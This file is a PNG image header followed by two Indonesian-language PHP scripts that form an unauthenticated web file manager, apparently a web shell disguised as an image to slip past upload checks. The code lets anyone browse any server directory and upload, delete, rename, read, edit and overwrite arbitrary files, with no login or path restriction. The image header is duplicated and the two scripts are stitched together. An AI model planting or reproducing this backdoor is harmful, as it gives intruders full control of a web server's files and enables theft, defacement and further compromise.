‰PNG

   
IHDR   `   `   â˜w8   tEXtSoftware Adobe ImageReadyqÉe<  ¡IDATxÚìkp×€ÏJ–-ÙV-ÛXØ¦bjR ¤	/¹0éÉÔð‡¶L;à4ig:÷_§:“þHÚÓ?mÒ“Ð&¦·Ó	µƒM(1Ø²©-#ãZÛ²,Ëê½ë+YZ½vW»w¯­œ™;«Ç>´ç»çÜsÎÝÕrÀ°Œ|{µ-ªIÃ¯W‘e*i!KjÎ‚£Wœ¬ž#Ç˜Â±¢í¨m&J·)¸{ã@@Ÿ˜Uúv´¨%Š·Q<t#j§ðñd ¤t¬èWPÛNYé‰¤µ#ZXGYñöÅ³(m¨B æ ¢ø}ÄÍÌÁƒö~ 8•o#ŠßsS°EÔ«éš8•ÿ*q7˜û‚ì:5kNÅãðñ0	#ç“x„Ff åcWs`žôúdS½RÖÀ)¨üÃsØ×Ëv(‘as
(÷öæyèrÄ¸¤¡M3 Zùû~€ñ© ø¦ÜC#ÀMzaÁLPlÎ³)›‰PNG

   
IHDR   `   `   â˜w8   tEXtSoftware Adobe ImageReadyqÉe<  ¡IDATxÚìkp×€ÏJ–-ÙV-ÛXØ¦bjR ¤	/¹0éÉÔð‡¶L;à4ig:÷_§:“þHÚÓ?mÒ“Ð&¦·Ó	µƒM(1Ø²©-#ãZÛ²,Ëê½ë+YZ½vW»w¯­œ™;«Ç>´ç»çÜsÎÝÕrÀ°Œ|{µ-ªIÃ¯W‘e*i!KjÎ‚£Wœ¬ž#Ç˜Â±¢í¨m&J·)¸{ã@@Ÿ˜Uúv´¨%Š·Q<t#j§ðñd ¤t¬èWPÛNYé‰¤µ#ZXGYñöÅ³(m¨B æ ¢ø}ÄÍÌÁƒö~ 8•o#ŠßsS°EÔ«éš8•ÿ*q7˜û‚ì:5kNÅãðñ0	#ç“x„Ff åcWs`žôúdS½RÖÀ)¨üÃsØ×Ëv(‘as
(÷öæyèrÄ¸¤¡M3 Zùû~€ñ© ø¦ÜC#ÀMzaÁLPlÎ³)›<?php
function x($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' B';
    }
}

function getIcon($path) {
    return is_dir($path) ? '📁' : '📄';
}

$currentPath = isset($_GET['d']) ? $_GET['d'] : getcwd();
if (!is_dir($currentPath)) {
    $currentPath = getcwd();
}

if (isset($_POST['upload'])) {
    $targetFile = $currentPath . DIRECTORY_SEPARATOR . $_FILES['uploaded_file']['name'];
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetFile)) {
        echo "<script>alert('File berhasil diunggah!');</script>";
    } else {
        echo "<script>alert('Gagal mengunggah file!');</script>";
    }
}

if (isset($_POST['create_folder'])) {
    $folderName = $_POST['folder_name'];
    if ($folderName && mkdir($currentPath . DIRECTORY_SEPARATOR . $folderName)) {
        echo "<script>alert('Folder berhasil dibuat!');</script>";
    } else {
        echo "<script>alert('Gagal membuat folder!');</script>";
    }
}

if (isset($_POST['rename'])) {
    $oldPath = $_POST['rename_path'];
    $newName = $_POST['new_name'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
    if (rename($oldPath, $newPath)) {
        echo "<script>alert('Nama berhasil diubah!');</script>";
    } else {
        echo "<script>alert('Gagal mengubah nama!');</script>";
    }
}

if (isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (is_dir($deletePath)) {
        rmdir($deletePath);
    } else {
        unlink($deletePath);
    }
    echo "<script>alert('Berhasil dihapus!');</script>";
}

if (isset($_GET['view'])) {
    $viewPath = $_GET['view'];
    if (is_file($viewPath)) {
        header('Content-Type: text/plain');
        readfile($viewPath);
        exit;
    }
}

?><?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Pastikan 'dir' dipakai konsisten: jika POST ada hidden 'current_dir', gunakan itu.
// Kalau tidak ada, ambil dari GET; fallback ke getcwd()
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['current_dir'])) {
    $currentDir = realpath($_POST['current_dir']);
} else {
    $currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
}
if ($currentDir === false) {
    // realpath gagal (mungkin path tidak ada) -> fallback ke getcwd()
    $currentDir = getcwd();
}

// Helper: tampilkan path yang relatif/aman untuk URL
function pathForUrl($fullPath) {
    // jika path berada di bawah document root, bisa diubah; kita pakai rawurlencode untuk link file
    return rawurlencode($fullPath);
}

// Fungsi listing (sama seperti sebelumnya)
function listFilesAndDirs($dir)
{
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === ".") continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $encodedPath = urlencode($path);
        echo "<tr>";
        echo "<td>" . (is_dir($path) ? "📁" : "📄") . "</td>";
        echo "<td>";
        if (is_dir($path)) {
            echo "<a href='?dir=$encodedPath'>$item</a>";
        } else {
            // untuk file, jangan pakai href yang langsung path file sistem (bisa bermasalah)
            // jika ingin buka file, Anda perlu buat path relatif ke webroot — ini contoh sederhana:
            echo "<a href='" . htmlspecialchars(basename($path)) . "' target='_blank'>$item</a>";
        }
        echo "</td>";
        echo "<td>";
        echo "<form method='post' style='display:inline;' onsubmit='return confirm(\"Yakin hapus?\")'>
                <input type='hidden' name='delete' value='$path'>
                <input type='hidden' name='current_dir' value='" . htmlspecialchars($dir) . "'>
                <button>🗑 Hapus</button>
              </form> ";
        echo "<form method='post' style='display:inline;'>
                <input type='hidden' name='rename_path' value='$path'>
                <input type='hidden' name='current_dir' value='" . htmlspecialchars($dir) . "'>
                <input type='text' name='new_name' placeholder='Nama baru' required>
                <button>✏️ Rename</button>
              </form> ";
        if (!is_dir($path)) {
            echo "<form method='post' style='display:inline;'>
                    <input type='hidden' name='edit_path' value='$path'>
                    <input type='hidden' name='current_dir' value='" . htmlspecialchars($dir) . "'>
                    <button>📝 Edit</button>
                  </form>";
        }
        echo "</td>";
        echo "</tr>";
    }
}

// ------------------ UPLOAD: perbaikan ------------------
// Jika upload dikirim, gunakan nilai current_dir dari POST untuk memastikan target benar
// ------------------ UPLOAD: perbaikan ------------------
$uploadMessage = '';
if (isset($_FILES['upload'])) {
    if (!is_dir($currentDir)) {
        $uploadMessage = "Target folder tidak ada: " . htmlspecialchars($currentDir);
    } elseif (!is_writable($currentDir)) {
        $uploadMessage = "Folder tujuan tidak dapat ditulis (permission): " . htmlspecialchars($currentDir);
    } else {
        $file = $_FILES['upload'];
        if ($file['error'] !== UPLOAD_ERR_OK) {
            $uploadMessage = "Upload error. Kode: " . intval($file['error']);
        } elseif (!is_uploaded_file($file['tmp_name'])) {
            $uploadMessage = "File upload tidak valid (bukan file upload).";
        } else {
            // Sanitasi nama file tanpa tambahan time()
            $name = basename($file['name']);
            $safe = preg_replace('/[^A-Za-z0-9._-]/', '_', $name);
            $target = $currentDir . DIRECTORY_SEPARATOR . $safe;

            if (!is_dir($currentDir)) {
                if (!@mkdir($currentDir, 0755, true)) {
                    $uploadMessage = "Gagal membuat folder tujuan: " . htmlspecialchars($currentDir);
                }
            }

            if (empty($uploadMessage)) {
                if (@move_uploaded_file($file['tmp_name'], $target)) {
                    $uploadMessage = "✅ Berhasil upload: " . htmlspecialchars($safe);
                    $uploadMessage .= "<br>Lokasi server: " . htmlspecialchars($target);
                } else {
                    $uploadMessage = "Gagal memindahkan file ke: " . htmlspecialchars($target);
                }
            }
        }
    }
}


// ------------------ DELETE ------------------
if (isset($_POST['delete'])) {
    $target = $_POST['delete'];
    // pastikan current_dir tetap (dikirim di form)
    if (is_dir($target)) {
        // hapus folder hanya jika kosong, atau gunakan fungsi rekursif kalau mau
        @rmdir($target);
    } else {
        @unlink($target);
    }
    // redirect ke dir sekarang (agar listing ter-refresh)
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

// ------------------ RENAME ------------------
if (isset($_POST['rename_path'], $_POST['new_name'])) {
    $old = $_POST['rename_path'];
    $new = dirname($old) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
    @rename($old, $new);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

// ------------------ EDIT handling (sama) ------------------
if (isset($_POST['edit_path']) && file_exists($_POST['edit_path'])) {
    $editPath = $_POST['edit_path'];
    $fileContent = htmlspecialchars(file_get_contents($editPath));
    echo "<h3>Edit File: " . htmlspecialchars($editPath) . "</h3>
    <form method='post'>
        <textarea name='content' rows='20' cols='100'>$fileContent</textarea><br>
        <input type='hidden' name='save_path' value='" . htmlspecialchars($editPath) . "'>
        <input type='hidden' name='current_dir' value='" . htmlspecialchars($currentDir) . "'>
        <button>Simpan</button>
    </form>";
    exit;
}

if (isset($_POST['save_path'], $_POST['content'])) {
    file_put_contents($_POST['save_path'], $_POST['content']);
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

// ------------------ CREATE file/folder ------------------
if (isset($_POST['new_file'])) {
    file_put_contents($currentDir . DIRECTORY_SEPARATOR . basename($_POST['new_file']), '');
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}
if (isset($_POST['new_folder'])) {
    mkdir($currentDir . DIRECTORY_SEPARATOR . basename($_POST['new_folder']));
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>File Manager</title></head>
<body>
<h2>📁 File Manager</h2>
<p><strong>Lokasi Saat Ini:</strong> <?= htmlspecialchars($currentDir) ?></p>

<?php if ($uploadMessage): ?>
    <div style="padding:8px; background:#efe; border:1px solid #cfc;"><?= $uploadMessage ?></div>
<?php endif; ?>

<!-- Form upload: sertakan hidden current_dir agar POST tahu target -->
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="current_dir" value="<?= htmlspecialchars($currentDir) ?>">
    <input type="file" name="upload" required>
    <button>⬆️ Upload</button>
</form>

<!-- Create forms: sertakan current_dir juga -->
<form method="post" style="margin-top:8px;">
    <input type="hidden" name="current_dir" value="<?= htmlspecialchars($currentDir) ?>">
    <input type="text" name="new_file" placeholder="Nama file baru">
    <button>📄 Buat File</button>
</form>

<form method="post" style="margin-top:8px;">
    <input type="hidden" name="current_dir" value="<?= htmlspecialchars($currentDir) ?>">
    <input type="text" name="new_folder" placeholder="Nama folder baru">
    <button>📁 Buat Folder</button>
</form>

<table border="1" cellpadding="6" style="margin-top:10px;">
    <tr><th>Type</th><th>Nama</th><th>Aksi</th></tr>
    <?php listFilesAndDirs($currentDir); ?>
</table>
</body>
</html>
